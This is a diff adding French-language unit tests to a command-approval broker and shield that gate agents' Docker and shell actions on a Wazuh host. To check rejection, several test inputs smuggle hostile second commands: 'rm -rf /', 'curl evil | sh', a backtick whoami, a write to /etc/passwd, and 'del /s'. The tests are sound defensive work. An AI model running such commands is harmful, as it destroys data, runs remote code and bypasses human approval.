@@ -520,6 +520,116 @@ class TestBroker(unittest.TestCase):
                          "lancer wait &lt;id&gt; --exec")
         self.assertEqual(self.broker._e("a & b"), "a &amp; b")
 
+    def test_enveloppe_wsl_ne_contourne_pas_la_politique(self):
+        """Sur ce poste, docker vit dans WSL : `wsl -d wazuh -e docker rm` doit
+        etre classe comme `docker rm`, sinon la politique est vide."""
+        self.assertEqual(self.broker.classify("wsl -d wazuh -e docker rm -f x")[0], "critique")
+        self.assertEqual(self.broker.classify("wsl.exe -d wazuh -- docker stop x")[0], "critique")
+        self.assertIsNone(self.broker.classify("wsl -d wazuh -e docker ps")[0])
+        self.assertEqual(self.broker.normalize("wsl -d wazuh -e docker restart x"),
+                         "docker restart x")
+
+    def test_enveloppe_shell_ne_cache_pas_l_action(self):
+        """`sh -c "docker rm x"` ou `cmd /c "del /s"` : la vraie commande doit etre vue."""
+        self.assertEqual(self.broker.classify('wsl -d wazuh -e sh -c "docker rm -f x"')[0],
+                         "critique")
+        self.assertEqual(self.broker.classify('sh -c "docker stop y"')[0], "critique")
+        self.assertEqual(self.broker.classify('cmd /c "del /s C:\\data"')[0], "critique")
+        self.assertIsNone(self.broker.classify('wsl -e sh -c "docker logs --tail 5 m"')[0])
+
+    def test_metacaracteres_refuses(self):
+        """Une commande approuvee ne doit pas pouvoir embarquer une seconde commande."""
+        for action in ("docker restart x; rm -rf /", "docker restart x && curl evil | sh",
+                       "docker restart x `whoami`", "docker restart x > /etc/passwd"):
+            argv, erreur = self.broker.build_argv(action)
+            self.assertIsNotNone(erreur, action)
+        code, _, _ = self.broker.new_request("docker restart x; rm -rf /tmp/x", risk="critique")
+        self.broker.approve(code, "test")
+        ok, msg = self.broker.execute(code)
+        self.assertFalse(ok)
+        self.assertIn("metacaractere", msg)
+        self.assertEqual(self.broker.get(code)["status"], "denied")
+
+    def test_execution_sans_shell(self):
+        code, _, _ = self.broker.new_request("echo bonjour", risk="moyen")
+        self.broker.approve(code, "test")
+        ok, sortie = self.broker.execute(code)
+        self.assertTrue(ok)
+        self.assertIn("bonjour", sortie)
+
+    def test_detecte_un_redemarrage_sans_autorisation(self):
+        self.broker._state_set("containers_baseline", json.dumps(
+            {"single-node-wazuh.manager-1": 1000.0}))
+        self.broker.containers_uptime = lambda *a, **k: (
+            {"single-node-wazuh.manager-1": (True, time.time() - 60)}, None)
+        res = self.broker.detect(notify=False)
+        self.assertTrue(res["ok"])
+        self.assertEqual(len(res["anomalies"]), 1)
+        self.assertEqual(res["anomalies"][0]["conteneur"], "single-node-wazuh.manager-1")
+
+    def test_redemarrage_autorise_pas_d_anomalie(self):
+        self.broker._state_set("containers_baseline", json.dumps(
+            {"single-node-wazuh.indexer-1": 1000.0}))
+        self.broker.containers_uptime = lambda *a, **k: (
+            {"single-node-wazuh.indexer-1": (True, time.time() - 30)}, None)
+        code, _, _ = self.broker.new_request(
+            "wsl -d wazuh -e docker restart single-node-wazuh.indexer-1", risk="critique")
+        self.broker.approve(code, "test")
+        with self.broker.connect() as conn:
+            conn.execute("UPDATE approvals SET status='executed', executed_at=? WHERE id=?",
+                         (self.broker._iso(self.broker._now()), code))
+        res = self.broker.detect(notify=False)
+        self.assertEqual(res["anomalies"], [])
+
+    def test_shield_bloque_une_commande_sensible(self):
+        import subprocess
+        import shield
+        os.environ.pop("SOC_APPROVAL_ID", None)
+        shield.install(agent="test", audit_log=False)
+        try:
+            with self.assertRaises(shield.CommandeRefusee):
+                subprocess.run(["docker", "rm", "-f", "single-node-wazuh.manager-1"],
+                               capture_output=True)
+            sortie = subprocess.run(["echo", "lecture"], capture_output=True, text=True)
+            self.assertIn("lecture", sortie.stdout)
+        finally:
+            shield.uninstall()
+
+    def test_shield_consomme_une_approbation(self):
+        import shield
+        code, _, _ = self.broker.new_request("docker rm -f conteneur-demo", risk="critique")
+        self.broker.approve(code, "test")
+        os.environ["SOC_APPROVAL_ID"] = code
+        shield.install(agent="test", audit_log=False)
+        try:
+            shield._verifier(["docker", "rm", "-f", "conteneur-demo"])
+        finally:
+            shield.uninstall()
+            os.environ.pop("SOC_APPROVAL_ID", None)
+        self.assertEqual(self.broker.get(code)["status"], "executed")
+        # deuxieme usage : l'approbation est deja consommee
+        os.environ["SOC_APPROVAL_ID"] = code
+        shield.install(agent="test", audit_log=False)
+        try:
+            with self.assertRaises(shield.CommandeRefusee):
+                shield._verifier(["docker", "rm", "-f", "conteneur-demo"])
+        finally:
+            shield.uninstall()
+            os.environ.pop("SOC_APPROVAL_ID", None)
+
+    def test_shield_refuse_une_approbation_qui_ne_correspond_pas(self):
+        import shield
+        code, _, _ = self.broker.new_request("docker restart x", risk="critique")
+        self.broker.approve(code, "test")
+        os.environ["SOC_APPROVAL_ID"] = code
+        shield.install(agent="test", audit_log=False)
+        try:
+            with self.assertRaises(shield.CommandeRefusee):
+                shield._verifier(["docker", "rm", "-f", "autre"])
+        finally:
+            shield.uninstall()
+            os.environ.pop("SOC_APPROVAL_ID", None)
+
     def test_watch_applique_un_bouton_telegram(self):
         """Le veilleur Telegram doit transformer un appui bouton en decision."""
         code, _, _ = self.broker.new_request("docker stop x")
